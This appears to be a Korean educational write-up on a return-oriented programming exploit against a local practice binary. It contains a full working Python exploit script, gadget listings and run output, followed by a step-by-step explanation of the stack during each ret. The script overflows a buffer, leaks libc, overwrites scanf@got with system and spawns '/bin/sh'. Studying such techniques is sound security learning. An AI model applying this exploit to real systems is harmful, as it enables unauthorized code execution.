Exploit using ROP :
    leak된 libc.so.6 라이브러리 주소를 이용하여 셸을 얻어보겠습니다.

    익스플로잇에서는 ROP를 통해 scanf 함수를 호출해 scanf@got에는 system 함수의 주소를,
    scanf@got+4에는 "/bin/sh" 문자열을 입력한 후 scanf@plt 를 호출하여 최종적으로 system("/bin/sh")를 실행합니다.

    ROP 체인에서 함수를 호출할 때, 다음 체인을 실행하기 위해 esp 레지스터를 호출한 함수의 인자 다음으로 가리키게 해주어야 합니다.

    objdump를 이용해 pop; pop; ret 코드 가젯을 찾아보도록 하겠습니다.
    ex)
        $ objdump -d ./example4 | grep -A3 pop
            804830d:	5b                   	pop    %ebx
            804830e:	c3                   	ret    
        
        Disassembly of section .plt:
        --
            8048362:	5e                   	pop    %esi
            8048363:	89 e1                	mov    %esp,%ecx
            8048365:	83 e4 f0             	and    $0xfffffff0,%esp
            8048368:	50                   	push   %eax
        --
            8048518:	5b                   	pop    %ebx
            8048519:	5e                   	pop    %esi
            804851a:	5f                   	pop    %edi
            804851b:	5d                   	pop    %ebp
            804851c:	c3                   	ret    
            804851d:	8d 76 00             	lea    0x0(%esi),%esi
        --
            8048536:	5b                   	pop    %ebx
            8048537:	c3                   	ret    

    objdump의 결과를 보면 0x804851a 주소에 pop; pop; ret 코드 가젯이 존재하는 것을 알 수 있습니다.

    example4.py에서는 pop; pop; ret 코드 가젯(line 43 ~ 45)을 이용하여 esp 레지스터를 scanf 함수의 인자 2개 이후 주소로 가리키게 해주었습니다.
    ex)
        #!/usr/bin/python
        '''
        example4.py
        '''
        import struct
        import subprocess
        import os
        import pty
        import time
        
        def readline(fd):
            res = ''
            try:
                while True:
                ch = os.read(fd, 1)
                res += ch
                if ch == '\n':
                    return res
            except:
                raise
        
        def read(fd, n):
            return os.read(fd, n)
        
        def writeline(proc, data):
            try:
                proc.stdin.write(data + '\n')
            except:
                raise
        
        def p32(val):
            return struct.pack("<I", val)
        
        def u32(data):
            return struct.unpack("<I", data)[0]
        
        out_r, out_w = pty.openpty()    # to ignore buffer
        s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
        
        '''
        0x804851a <__libc_csu_init+90>:  pop    %edi
        0x804851b <__libc_csu_init+91>:  pop    %ebp
        0x804851c <__libc_csu_init+92>:  ret    
        '''
        
        pop_pop_ret = 0x804851a
        pop_ret = pop_pop_ret + 1
        scanf_plt = 0x8048340
        puts_plt = 0x8048320
        puts_got = 0x804a00c
        string_fmt = 0x8048559      # "%s"
        scanf_got = 0x804a014
        
        print `readline(out_r)`     # Hello World!\n
        print `readline(out_r)`     # Hello ASLR!\n
        
        payload  = "A"*36           # buf padding
        payload += p32(puts_plt + 6)   # ret addr (puts@plt + 6)
        payload += p32(pop_ret)  # ret after puts
        payload += p32(scanf_got)   # scanf@got
        payload += p32(scanf_plt)
        payload += p32(pop_pop_ret)
        payload += p32(string_fmt)
        payload += p32(scanf_got)
        payload += p32(scanf_plt)
        payload += p32(0xdeadbeef)
        payload += p32(scanf_got+4)
        
        print `payload`
       
        writeline(s, payload)
        
        libc = u32(readline(out_r)[:4]) - 0x5c0c0
        system = libc + 0x3ada0
        print "libc @ " + hex(libc)
        print "system @ " + hex(system)
        
        writeline(s, p32(system)+"/bin/sh\x00")
        
        print "[+] get shell"
        
        while True:
            cmd = raw_input("$ ")
            writeline(s, cmd)
            time.sleep(0.2)
            print read(out_r, 1024)

    example4.py를 실행하면 셸을 성공적으로 획득한 것을 볼 수 있습니다.
    ex)
        $ python example4.py
        'Hello World!\r\n'  
        'Hello ASLR!\r\n'
        'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x83\x04\x08\x1b\x85\x04\x08\x14\xa0\x04\x08@\x83\x04\x08\x1a\x85\x04\x08Y\x85\x04\x08\x14\xa0\x04\x08@\x83\x04\x08\xef\xbe\xad\xde\x18\xa0\x04\x08'
        libc @ 0xf7d5b000
        system @ 0xf7d95da0
        [+] get shell
        $ echo "SHELL_TEST"
        SHELL_TEST
        
        $ ls -al /etc/passwd
        -rw-r--r-- 1 root root 2434 Oct 17 22:18 /etc/passwd



설명 :
    일반적으로 함수 호출은 스택에 리턴주소(현재 위치)를 push하고 함수 주소로 eip가 바뀌는 것으로 알고 있습니다. 
    즉 call <함수 주소>을 어셈블리로 표현해보면

    push <복귀할 주소>
    jmp <함수 주소>
    와 동일하다고 볼 수 있습니다. 

    그리고 함수에게 인자(argument)를 전달할 때는 함수 호출 전에 미리 인자들을 스택에 push를 하고 함수를 호출한 다음 다시 복귀하면 
    esp값을 증가시켜서 전달한 인자들을 스택에서 제거합니다. 간단하게 printf("Hello");를 어셈블리어로 나타내면

    push   0x8048699 				; "Hello"의 주소값
    call   0x80483f0 <printf@plt>	; printf 호출
    add    esp,0x4					; 스택에서 "Hello"의 주소값을 제거
    
    스택을 정리하는 과정은 함수 호출 규약에 따라 다른 걸로 알고 있습니다. 이렇게 호출하는 쪽에서 정리하는 규칙을 cdecl 규칙이라고 합니다.

    한편 함수의 끝에는 보통 ret이 있는데 ret을 하면 스택에서 리턴주소(복귀주소)를 pop해서 그 주소로 jmp 하는 것으로 알고 있습니다.
    즉 ret을 표현해보면

    pop eip
    와 동일하다고 볼 수 있습니다.

    이제

    payload += p32(puts_plt + 6) # ret addr (puts@plt + 6)
    payload += p32(pop_ret) # ret after puts
    payload += p32(scanf_got) # scanf@got

    payload += p32(scanf_plt)
    payload += p32(pop_pop_ret)
    payload += p32(string_fmt)
    payload += p32(scanf_got)

    payload += p32(scanf_plt)
    payload += p32(0xdeadbeef)
    payload += p32(scanf_got+4)
    를 해석해 봅시다. 
    
    저렇게 payload를 입력해서 buffer overflow를 일으킨다면 main함수가 ret을 할 당시에 스택의 상태는 다음과 같이 됩니다.

    puts_plt + 6    <---- 스택의 top=가장 낮은 주소=esp가 가리키는 곳
    pop_ret
    scanf_got
    scanf_plt
    pop_pop_ret
    string_fmt
    scanf_got
    scanf_plt
    0xdeadbeef
    scanf_got+4
    
    여기서 ret을 하게 되면 스택에서 puts_plt + 6는 제거되고 puts_plt + 6로 점프하게 됩니다. 
    즉 puts함수로 점프된 직후 스택의 상태는 다음과 같이 됩니다.

    pop_ret     <---- 스택의 top=가장 낮은 주소=esp가 가리키는 곳
    scanf_got
    scanf_plt
    pop_pop_ret
    string_fmt
    scanf_got
    scanf_plt
    0xdeadbeef
    scanf_got+4

    즉 puts함수는 복귀주소를 스택의 top에 있는 pop_ret이라고 생각하고 전달받은 인자를 scanf_got이라고 생각하게 됩니다. 
    그렇게 되면 puts 함수는 scanf의 주소를 출력하고 이 출력값으로 libc 베이스 주소 = scanf 주소 - libc 베이스 주소로부터 
    scanf 주소까지의 오프셋를 통해 libc 베이스 주소를 알아낼 수 있습니다. 
    그럼 system 주소 = libc 베이스 주소 + libc 베이수 주소로부터 system 주소까지의 오프셋을 통해 system함수의 주소를 알아낼 수 있습니다. 
    한편 puts함수 마지막에 ret을 하면 pop_ret는 스택에서 제거되면서 pop_ret로 점프합니다. 즉 점프한 직후 스택의 상태는 다음과 같이 됩니다.

    scanf_got  <---- 스택의 top=가장 낮은 주소=esp가 가리키는 곳
    scanf_plt
    pop_pop_ret
    string_fmt
    scanf_got
    scanf_plt
    0xdeadbeef
    scanf_got+4
    이 됩니다. 
    
    점프한 pop_ret은 pop과 ret의 명령어가 차례로 있는 주소이므로 먼저 pop을 하게 되면 스택의 상태는 다음과 같이 됩니다.

    scanf_plt <---- 스택의 top=가장 낮은 주소=esp가 가리키는 곳
    pop_pop_ret
    string_fmt
    scanf_got
    scanf_plt
    0xdeadbeef
    scanf_got+4
    
    그다음 ret을 하면 scanf_plt을 스택에서 제거하면서 scanf_plt로 점프하게 됩니다. 
    scanf함수로 점프된 직후 스택의 상태는 다음과 같이 됩니다.

    pop_pop_ret <---- 스택의 top=가장 낮은 주소=esp가 가리키는 곳
    string_fmt
    scanf_got
    scanf_plt
    0xdeadbeef
    scanf_got+4
    
    scanf함수는 첫번째 인자를 string_fmt로 보고 string_fmt는 "%s"이므로 scanf_got를 두번째 인자로 보고 사용자의 입력을 받아서 
    scanf_got에 문자열을 입력합니다. 이때 사용자는 <system함수 주소>+"/bin/sh\0"를 입력합니다. 
    scanf함수 마지막에 ret을 하면 pop_pop_ret는 스택에서 제거되면서 pop_pop_ret로 점프하고 스택의 상태는 다음과 같이 됩니다.

    string_fmt <---- 스택의 top=가장 낮은 주소=esp가 가리키는 곳
    scanf_got
    scanf_plt
    0xdeadbeef
    scanf_got+4

    pop_pop_ret으로 점프했으니 여기서 두번의 pop을 하게 되면 스택의 상태는 다음과 같이 됩니다.

    scanf_plt <---- 스택의 top=가장 낮은 주소=esp가 가리키는 곳
    0xdeadbeef
    scanf_got+4
    
    이제 ret을 하면 scanf_plt는 스택에서 제거되며 scanf_plt로 점프하는데 방금 전에 scanf_got을 <system함수 주소>+"/bin/sh\0"으로 덮어썼으므로 
    scanf함수가 아니라 system함수로 점프됩니다. system함수로 점프된 직후 스택의 상태는 다음과 같이 됩니다.

    0xdeadbeef <---- 스택의 top=가장 낮은 주소=esp가 가리키는 곳
    scanf_got+4
    
    이제 system함수는 첫번째 인자로 scanf_got+4을 보는데 방금 전에 scanf_got을 <system함수 주소>+"/bin/sh\0"으로 덮어썼으므로 
    scanf_got+4는 "/bin/sh\0"과 같습니다. 즉 system("/bin/sh")를 호출한 직후와 동일하므로 쉘을 얻게됩니다.





















